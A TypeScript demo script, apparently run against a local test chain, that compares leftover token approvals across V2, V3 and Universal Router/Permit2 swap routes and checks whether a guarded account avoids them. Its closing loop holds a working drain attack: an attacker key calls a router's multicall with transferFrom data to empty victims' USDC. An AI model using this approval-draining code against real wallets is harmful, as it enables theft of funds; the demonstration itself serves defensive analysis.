import { encodeAbiParameters, encodeFunctionData, formatEther, maxUint256, parseAbi, parseAbiParameters, parseEther, type Address, type Hex } from 'viem'
import {
  CMD,
  MSG_SENDER,
  PERMIT2,
  compile,
  encodeUr,
  erc20Abi,
  guard,
  permit2Abi,
  routeDirect,
  specExample,
  v2RouterAbi,
  v3Path,
  type Call,
} from '../packages/core/src/index.js'
import { addr, keys, pub, send, table, wallet } from './lib.js'
import { setup } from './setup.js'

const d = await setup()
const amount = parseEther('100')
const deadline = (await pub.getBlock()).timestamp + 3600n
const attacker = addr(keys.attacker)
const A = d.victims.asked
const D = d.victims.direct
const C = d.account
const v3 = parseAbi([
  'function exactInputSingle((address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 amountIn, uint256 amountOutMinimum, uint160 sqrtPriceLimitX96) params) payable returns (uint256)',
  'function multicall(uint256 deadline, bytes[] data) payable returns (bytes[])',
])
const exploitAbi = parseAbi(['function multicall(address target, bytes data) returns (bytes)'])
const approve = (spender: Address): Call => ({ to: d.usdc, data: encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [spender, maxUint256] }) })
const pull = (victim: Address, amt: bigint) => encodeFunctionData({ abi: erc20Abi, functionName: 'transferFrom', args: [victim, attacker, amt] })

type Route = {
  name: string
  router: Address
  request: (who: Address) => Call[]
  exposure: (who: Address) => Promise<string>
  steal: (victim: Address, amt: bigint) => { target: Address; data: Hex }
}

const routerAllowance = (router: Address) => async (who: Address) => {
  const a = await pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'allowance', args: [who, router] })
  return a === maxUint256 ? 'unlimited allowance to the router' : a === 0n ? 'nothing' : `${formatEther(a)} USDC allowance`
}

const routes: Route[] = [
  {
    name: 'UniswapV2Router02-style',
    router: d.router2,
    request: (who) => [
      approve(d.router2),
      { to: d.router2, data: encodeFunctionData({ abi: v2RouterAbi, functionName: 'swapExactTokensForTokens', args: [amount, 1n, [d.usdc, d.weth], who, deadline] }) },
    ],
    exposure: routerAllowance(d.router2),
    steal: (v, amt) => ({ target: d.usdc, data: pull(v, amt) }),
  },
  {
    name: 'SwapRouter02-style V3, multicall(deadline, [exactInputSingle])',
    router: d.router3,
    request: () => [
      approve(d.router3),
      {
        to: d.router3,
        data: encodeFunctionData({
          abi: v3,
          functionName: 'multicall',
          args: [
            deadline,
            [
              encodeFunctionData({
                abi: v3,
                functionName: 'exactInputSingle',
                args: [{ tokenIn: d.usdc, tokenOut: d.weth, fee: 3000, recipient: MSG_SENDER, amountIn: amount, amountOutMinimum: 1n, sqrtPriceLimitX96: 0n }],
              }),
            ],
          ],
        }),
      },
    ],
    exposure: routerAllowance(d.router3),
    steal: (v, amt) => ({ target: d.usdc, data: pull(v, amt) }),
  },
  {
    name: 'Universal Router, Permit2 two-layer approval',
    router: d.ur,
    request: () => [
      approve(PERMIT2),
      { to: PERMIT2, data: encodeFunctionData({ abi: permit2Abi, functionName: 'approve', args: [d.usdc, d.ur, (1n << 160n) - 1n, 2 ** 48 - 1] }) },
      {
        to: d.ur,
        data: encodeUr({
          commands: [CMD.V3_SWAP_EXACT_IN],
          inputs: [encodeAbiParameters(parseAbiParameters('address, uint256, uint256, bytes, bool'), [MSG_SENDER, amount, 1n, v3Path([{ a: d.usdc, fee: 3000, b: d.weth }]), true])],
          deadline,
        }),
      },
    ],
    exposure: async (who) => {
      const [toP2, [p2Amount]] = await Promise.all([
        pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'allowance', args: [who, PERMIT2] }),
        pub.readContract({ address: PERMIT2, abi: permit2Abi, functionName: 'allowance', args: [who, d.usdc, d.ur] }),
      ])
      return toP2 === 0n && p2Amount === 0n ? 'nothing' : `token->Permit2 ${toP2 === maxUint256 ? 'unlimited' : formatEther(toP2)}, Permit2->router ${p2Amount === (1n << 160n) - 1n ? 'unlimited' : formatEther(p2Amount)}`
    },
    steal: (v, amt) => ({
      target: PERMIT2,
      data: encodeFunctionData({ abi: parseAbi(['function transferFrom(address from, address to, uint160 amount, address token)']), functionName: 'transferFrom', args: [v, attacker, amt, d.usdc] }),
    }),
  },
]

const usdc = (o: Address) => pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'balanceOf', args: [o] })
const weth = (o: Address) => pub.readContract({ address: d.weth, abi: erc20Abi, functionName: 'balanceOf', args: [o] })
const gas = (r: { receipt?: { frameReceipts: { gasUsed: bigint }[] } }) => r.receipt?.frameReceipts.reduce((a, f) => a + f.gasUsed, 0n) ?? 0n
const w = wallet(keys.attacker)

for (const route of routes) {
  console.log(`\n=== ${route.name}  ${route.router}`)
  for (const who of [A, D, C]) await d.topUp(d.usdc, who)
  const [wa, wd, wc] = [await weth(A), await weth(D), await weth(C)]

  const fa = specExample({ calls: route.request(A) })
  const ra = await send({ sender: A, signerKey: keys.asked, frames: fa })
  console.log(`A signs the dApp's request (${fa.length - 1} frames): ${ra.receipt?.frameReceipts.map((f) => f.status).join(',') ?? ra.sim.violation ?? ra.sim.executionError}`)

  const routed = await routeDirect(pub, { sender: D, seal: d.seal, permit2: PERMIT2, calls: route.request(D) }, { swapper: d.swapper })
  for (const n of routed.notes) console.log(`   ${n}`)
  const { frames: fd } = compile(routed)
  const rd = await send({ sender: D, signerKey: keys.direct, frames: fd })
  console.log(`D sends it through --strategy direct:`)
  table(fd, rd.receipt?.frameReceipts.map((f) => `${f.status} gas=${f.gasUsed}`))
  console.log(`   tx ${rd.hash}`)

  const rc = await routeDirect(pub, { sender: C, seal: d.seal, permit2: PERMIT2, account: 'zeroallow', calls: route.request(C) }, { swapper: d.swapper })
  const { frames: fc } = compile(rc)
  const rcs = await send({ sender: C, signerKey: keys.deployer, frames: fc })
  console.log(`guarded account, same route: guard ${guard(fc, C, d.seal, PERMIT2).reason}, ${rcs.receipt?.frameReceipts.map((f) => f.status).join(',') ?? rcs.sim.violation}`)

  console.log(`WETH out    A ${formatEther((await weth(A)) - wa)}   D ${formatEther((await weth(D)) - wd)}   guarded ${formatEther((await weth(C)) - wc)}`)
  console.log(`gas         A ${gas(ra)}   D ${gas(rd)}`)
  console.log(`left behind A: ${await route.exposure(A)}   D: ${await route.exposure(D)}   guarded: ${await route.exposure(C)}`)

  for (const [name, victim] of [['A', A], ['D', D], ['guarded', C]] as const) {
    const bal = await usdc(victim)
    const s = route.steal(victim, bal)
    try {
      await pub.simulateContract({ account: attacker, address: route.router, abi: exploitAbi, functionName: 'multicall', args: [s.target, s.data] })
    } catch {
      console.log(`   exploit vs ${name}: reverts, keeps ${formatEther(bal)} USDC`)
      continue
    }
    const hash = await w.writeContract({ address: route.router, abi: exploitAbi, functionName: 'multicall', args: [s.target, s.data], gas: 250_000n })
    await pub.waitForTransactionReceipt({ hash })
    console.log(`   exploit vs ${name}: drained ${formatEther(bal)} USDC  tx ${hash}`)
  }
}
